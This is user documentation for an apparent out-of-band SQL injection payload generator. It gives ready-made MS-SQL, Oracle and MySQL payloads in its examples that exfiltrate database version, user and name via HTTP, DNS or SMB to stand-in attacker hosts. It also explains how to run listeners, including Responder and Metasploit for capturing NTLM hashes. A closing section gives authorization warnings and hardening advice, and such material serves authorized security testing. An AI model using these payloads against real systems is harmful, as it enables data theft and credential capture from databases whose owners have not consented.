# Out-of-Band (OOB) SQL Injection Guide

## Table of Contents
1. [What is OOB SQL Injection?](#what-is-oob-sql-injection)
2. [Supported Databases](#supported-databases)
3. [Usage Guide](#usage-guide)
4. [API Reference](#api-reference)
5. [Listener Setup](#listener-setup)
6. [Examples](#examples)
7. [Security Considerations](#security-considerations)

---

## What is OOB SQL Injection?

Out-of-Band (OOB) SQL Injection is an advanced technique for extracting data from a database when traditional methods (direct query results or error messages) are not available. OOB techniques leverage database features that allow network connections to external systems, enabling attackers to exfiltrate data through alternative channels.

### When to Use OOB Techniques

- **Blind SQL Injection**: When the application doesn't display query results or error messages
- **Time-Based Detection**: When time-based blind injection is too slow or unreliable
- **WAF Bypassing**: Some WAFs don't inspect outbound database connections
- **Efficient Data Extraction**: Extract data in one request instead of character-by-character

### Common OOB Channels

1. **HTTP/HTTPS**: Database makes HTTP requests to attacker-controlled server
2. **DNS**: Database performs DNS lookups containing exfiltrated data
3. **SMB/UNC**: Database attempts to access attacker's SMB share (Windows only)
4. **LDAP**: Database connects to attacker's LDAP server

---

## Supported Databases

### Microsoft SQL Server (MS-SQL)

**Techniques:**
- `OPENROWSET` with HTTP connections
- `OPENROWSET` with SMB/UNC paths
- `xp_dirtree` with UNC paths (requires extended stored procedures)

**Requirements:**
- `Ad Hoc Distributed Queries` configuration enabled
- Sufficient database privileges
- Network connectivity to attacker's system

**Example Features Extracted:**
- Database version (`@@version`)
- Database name (`DB_NAME()`)
- Current user (`SYSTEM_USER`)
- Table names from system catalogs

---

### Oracle Database

**Techniques:**
- `UTL_HTTP`: HTTP/HTTPS requests
- `UTL_INADDR`: DNS lookups
- `DBMS_LDAP`: LDAP connections
- `UTL_TCP`: Raw TCP connections

**Requirements:**
- EXECUTE privileges on UTL_HTTP, UTL_INADDR, or DBMS_LDAP packages
- Network ACLs allowing outbound connections
- Oracle version supporting these packages (most modern versions)

**Example Features Extracted:**
- Current user (`user`)
- Database banner (`banner` from `v$version`)
- Tablespace information
- Custom query results

---

### MySQL/MariaDB

**Techniques:**
- `LOAD_FILE` with UNC paths (Windows only)
- `SELECT INTO OUTFILE` with UNC paths (Windows only)

**Requirements:**
- `FILE` privilege
- `secure_file_priv` configuration allowing UNC paths (Windows)
- MySQL running on Windows OS (UNC paths don't work on Linux)

**Example Features Extracted:**
- Database version (`@@version`)
- Current database (`DATABASE()`)
- User information (`USER()`)

**Note:** MySQL OOB techniques are limited to Windows environments due to UNC path dependency.

---

## Usage Guide

### Python API Usage

```python
from sql_attacker.oob_payloads import OOBPayloadGenerator, DatabaseType

# Initialize generator with your attacker host
generator = OOBPayloadGenerator(
    attacker_host="attacker.example.com",
    attacker_port=80
)

# Generate payloads for all databases
all_payloads = generator.generate_all_payloads()

# Generate payloads for specific database
mssql_payloads = generator.generate_mssql_payloads(data_to_exfiltrate="@@version")
oracle_payloads = generator.generate_oracle_payloads(data_to_exfiltrate="user")
mysql_payloads = generator.generate_mysql_payloads(data_to_exfiltrate="@@version")

# Display formatted payload
for payload in mssql_payloads:
    print(generator.format_payload_for_output(payload))

# Get listener setup guide
http_guide = generator.get_listener_setup_guide('http')
print(http_guide)
```

### REST API Usage

#### Generate OOB Payloads

**Endpoint:** `POST /sql_attacker/api/oob/generate/`

**Request:**
```json
{
    "attacker_host": "attacker.example.com",
    "attacker_port": 80,
    "db_type": "mssql",
    "data_to_exfiltrate": "@@version"
}
```

**Parameters:**
- `attacker_host` (required): Your attacker-controlled domain or IP
- `attacker_port` (optional): Port for listener (default: 80)
- `db_type` (optional): `mssql`, `oracle`, `mysql`, or null for all
- `data_to_exfiltrate` (optional): SQL expression to extract

**Response:**
```json
{
    "mssql": [
        {
            "technique": "mssql_openrowset_http",
            "payload": "' UNION SELECT 1,2,3 FROM OPENROWSET(...)",
            "description": "MS-SQL OpenRowSet HTTP exfiltration",
            "requires_privileges": true,
            "privilege_level": "Requires 'Ad Hoc Distributed Queries' enabled",
            "listener_type": "http",
            "example_listener_setup": "nc -lvnp 80 or python -m http.server 80"
        }
    ]
}
```

#### Get Listener Setup Guide

**Endpoint:** `GET /sql_attacker/api/oob/listener-guide/?listener_type=http`

**Parameters:**
- `listener_type`: `http`, `smb`, `dns`, or `ldap`

**Response:**
```json
{
    "listener_type": "http",
    "setup_guide": "HTTP Listener Setup:\n\n1. Simple Netcat listener:\n   nc -lvnp 80\n..."
}
```

---

## Listener Setup

### HTTP Listener

HTTP listeners capture HTTP requests made by the database server.

**Option 1: Netcat (Simple)**
```bash
# Listen on port 80
nc -lvnp 80

# Or on high port (no root required)
nc -lvnp 8080
```

**Option 2: Python HTTP Server**
```bash
# Built-in Python HTTP server
python3 -m http.server 80

# With access logging
sudo python3 -m http.server 80 2>&1 | tee http_log.txt
```

**Option 3: Custom Python Server**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

class LoggingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"Received request: {self.path}")
        logging.info(f"Headers: {self.headers}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        logging.info(f"HTTP: {format % args}")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO, 
                       format='%(asctime)s - %(message)s')
    server = HTTPServer(('0.0.0.0', 80), LoggingHandler)
    print("HTTP server listening on port 80...")
    server.serve_forever()
```

**Option 4: ngrok (External Access)**
```bash
# Start local server
python3 -m http.server 8080

# Tunnel to internet
ngrok http 8080

# Use the ngrok URL as attacker_host
# Example: abc123.ngrok-free.app
```

---

### SMB Listener

SMB listeners capture Windows UNC path connections and can log NTLM hashes.

**Option 1: Impacket smbserver (Recommended)**
```bash
# Install Impacket
pip install impacket

# Create SMB share
# Note: Port 445 (default SMB) requires root/admin privileges
smbserver.py share /tmp/share -smb2support

# With specific IP binding
smbserver.py share /tmp/share -ip 192.168.1.100 -smb2support

# Alternative: Use high port (no admin required) with custom configuration
# However, most OOB techniques expect standard port 445
```

**Option 2: Responder (Hash Capture)**
```bash
# Install Responder
git clone https://github.com/lgandx/Responder.git
cd Responder

# Run Responder
sudo python Responder.py -I eth0

# Captured hashes saved to logs/
# Analyze with hashcat or john
```

**Option 3: Metasploit SMB Capture**
```bash
msfconsole
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/captured_hashes.txt
set SRVHOST 0.0.0.0
set SRVPORT 445
run

# Hashes saved to /tmp/captured_hashes.txt
```

**Note:** SMB listeners require administrative/root privileges for port 445 (standard SMB port). On Unix-like systems, any port below 1024 requires elevated privileges. The SMB protocol specifically uses port 445 for direct hosting, and attempting to bind to this port without proper privileges will fail.

---

### DNS Listener

DNS listeners log DNS queries containing exfiltrated data in subdomain labels.

**Option 1: tcpdump (Simple)**
```bash
# Capture all DNS queries
sudo tcpdump -i any -n port 53

# Save to file
sudo tcpdump -i any -n port 53 -w dns_capture.pcap

# Read captured file
tcpdump -r dns_capture.pcap -n port 53
```

**Option 2: External DNS Logging Services**

- **dnslog.cn**: http://dnslog.cn (provides temporary subdomain)
- **Burp Collaborator**: Built into Burp Suite Professional
- **Interactsh**: https://app.interactsh.com (open source)
- **Canarytokens**: https://canarytokens.org

**Option 3: Custom DNS Server**
```python
# Install dnslib
# pip install dnslib

from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import logging

class LoggingResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        logging.info(f"DNS Query: {qname}")
        
        # Respond with dummy IP
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1")))
        return reply

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO,
                       format='%(asctime)s - %(message)s')
    resolver = LoggingResolver()
    server = DNSServer(resolver, port=53, address='0.0.0.0')
    print("DNS server listening on port 53...")
    server.start()
```

**Subdomain Delegation:**
For production use, delegate a subdomain to your DNS server:
```
# Add NS record for subdomain
oob.attacker.com.    IN    NS    ns1.attacker.com.
ns1.attacker.com.    IN    A     <your_server_ip>
```

---

### LDAP Listener

LDAP listeners capture LDAP connection attempts.

**Option 1: Netcat (Simple)**
```bash
# Listen on LDAP port (requires root)
sudo nc -lvnp 389

# Or high port
nc -lvnp 3389
```

**Option 2: Python Socket Listener**
```python
import socket
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def ldap_listener(port=389):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(5)
    
    logging.info(f"LDAP listener started on port {port}")
    
    while True:
        conn, addr = sock.accept()
        logging.info(f"LDAP connection from {addr[0]}:{addr[1]}")
        try:
            data = conn.recv(1024)
            logging.info(f"Received {len(data)} bytes")
            logging.info(f"Data: {data.hex()}")
        except Exception as e:
            logging.error(f"Error: {e}")
        finally:
            conn.close()

if __name__ == '__main__':
    ldap_listener(389)  # Requires root for port 389
```

---

## Examples

### Example 1: MS-SQL HTTP Exfiltration

**Scenario:** Extract database version via HTTP

**Setup Listener:**
```bash
python3 -m http.server 80
```

**Generate Payload:**
```python
from sql_attacker.oob_payloads import OOBPayloadGenerator

generator = OOBPayloadGenerator("attacker.com", 80)
payloads = generator.generate_mssql_payloads("@@version")

print(payloads[0].payload)
# Output: '; DECLARE @data VARCHAR(8000); SET @data=(SELECT @@version); 
#         EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Network=DBMSSOCN;
#         Address=http://'+(SELECT @data)+'.attacker.com:80;uid=sa;pwd=pass'',
#         ''SELECT 1'')')--
```

**Inject Payload:**
Inject the payload into vulnerable parameter. The database will make an HTTP request to your server with the version in the hostname/subdomain.

**Capture Result:**
```
GET / HTTP/1.1
Host: Microsoft-SQL-Server-2019-15.0.4123.1.attacker.com
```

---

### Example 2: Oracle DNS Exfiltration

**Scenario:** Extract current user via DNS

**Setup Listener:**
```bash
# Use dnslog.cn or run custom DNS server
sudo tcpdump -i any -n port 53
```

**Generate Payload:**
```python
generator = OOBPayloadGenerator("attacker.com", 80)
payloads = generator.generate_oracle_payloads("user")

# Find UTL_INADDR payload
dns_payload = [p for p in payloads if 'UTL_INADDR' in p.payload][0]
print(dns_payload.payload)
# Output: ' UNION SELECT UTL_INADDR.get_host_address((user)||'.attacker.com') FROM dual--
```

**Inject Payload:**
Inject the payload into vulnerable parameter.

**Capture Result:**
```
DNS Query: SCOTT.attacker.com
```
The username `SCOTT` is exfiltrated via DNS query.

---

### Example 3: MySQL SMB Exfiltration (Windows)

**Scenario:** Extract database name via SMB connection

**Setup Listener:**
```bash
# Install and run Impacket smbserver
pip install impacket
smbserver.py share /tmp/share -smb2support
```

**Generate Payload:**
```python
generator = OOBPayloadGenerator("192.168.1.100", 445)
payloads = generator.generate_mysql_payloads("DATABASE()")

# Find LOAD_FILE payload with data exfiltration
smb_payload = [p for p in payloads if 'CONCAT' in p.payload][0]
print(smb_payload.payload)
# Output: ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',
#         (DATABASE()),'.192.168.1.100\\\\share\\\\file.txt'))--
```

**Inject Payload:**
Inject the payload into vulnerable parameter (MySQL on Windows only).

**Capture Result:**
```
[*] Incoming connection from 192.168.1.50
[*] Authenticating against \\\mydb.192.168.1.100\share
```
Database name `mydb` is captured in the UNC path.

---

### Example 4: REST API Usage

**Generate Payloads via API:**
```bash
curl -X POST http://localhost:8000/sql_attacker/api/oob/generate/ \
  -H "Content-Type: application/json" \
  -d '{
    "attacker_host": "attacker.example.com",
    "attacker_port": 80,
    "db_type": "oracle",
    "data_to_exfiltrate": "banner"
  }'
```

**Get Listener Setup Guide:**
```bash
curl http://localhost:8000/sql_attacker/api/oob/listener-guide/?listener_type=dns
```

---

## Security Considerations

### Legal and Ethical Use

⚠️ **WARNING:** OOB SQL injection is an advanced penetration testing technique that should only be used:

1. **With explicit written authorization** from the target system owner
2. **Within scope** of authorized security assessments
3. **In compliance** with applicable laws and regulations
4. **On systems you own** or have permission to test

Unauthorized use may be illegal in your jurisdiction.

### Network Detection

OOB techniques are easier to detect than traditional SQL injection:

1. **Outbound Connections**: Network monitoring can detect unusual outbound connections from database servers
2. **DNS Logs**: DNS queries with encoded data are suspicious
3. **Firewall Rules**: Restrictive egress filtering may block OOB channels
4. **IDS/IPS**: Intrusion detection systems can flag unusual database network activity

### Operational Security

When using OOB techniques in authorized testing:

1. **Use dedicated infrastructure**: Separate testing infrastructure from production
2. **Document all activity**: Keep detailed logs of all testing activities
3. **Rotate attacker hosts**: Use different domains/IPs for different engagements
4. **Clean up**: Remove test artifacts and close listeners after testing
5. **Secure listener data**: Protect captured data appropriately

### Database Hardening

To protect against OOB SQL injection:

1. **Restrict network access**: Database servers should have limited outbound connectivity
2. **Disable dangerous features**:
   - MS-SQL: Disable `Ad Hoc Distributed Queries`
   - Oracle: Revoke EXECUTE on UTL_HTTP, UTL_INADDR, DBMS_LDAP
   - MySQL: Restrict FILE privilege and `secure_file_priv`
3. **Monitor outbound connections**: Alert on unexpected database network activity
4. **Use least privilege**: Database accounts should have minimal required privileges
5. **Input validation**: Properly validate and sanitize all user inputs

---

## Troubleshooting

### Common Issues

**Issue: Payloads not triggering OOB connections**

Solutions:
- Check database privileges (EXECUTE on packages, FILE privilege)
- Verify database configuration (Ad Hoc Distributed Queries, secure_file_priv)
- Ensure network connectivity (firewalls, egress filtering)
- Test with basic payload first before adding data exfiltration

**Issue: No data captured on listener**

Solutions:
- Verify listener is running and accessible
- Check firewall rules on listener host
- Ensure correct port numbers
- Test connectivity from database server to listener

**Issue: DNS exfiltration not working**

Solutions:
- Ensure subdomain delegation is configured correctly
- Use external DNS logging service (dnslog.cn, Burp Collaborator)
- Check DNS server logs
- Verify database has DNS resolution working

**Issue: MySQL UNC paths failing**

Solutions:
- MySQL OOB only works on Windows
- Check `secure_file_priv` configuration
- Verify FILE privilege is granted
- Try alternative techniques (HTTP via LOAD_FILE with plugins on some configurations)

---

## Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy: SQL Injection](https://portswigger.net/web-security/sql-injection)
- [MS-SQL OPENROWSET Documentation](https://docs.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql)
- [Oracle UTL_HTTP Documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)

---

## Contributing

To add support for additional databases or OOB techniques:

1. Extend `OOBPayloadGenerator` class in `sql_attacker/oob_payloads.py`
2. Add new `OOBTechnique` enum values
3. Implement generator method following existing patterns
4. Add tests to `sql_attacker/test_oob_payloads.py`
5. Update this documentation with examples

For questions or contributions, please open an issue on the project repository.
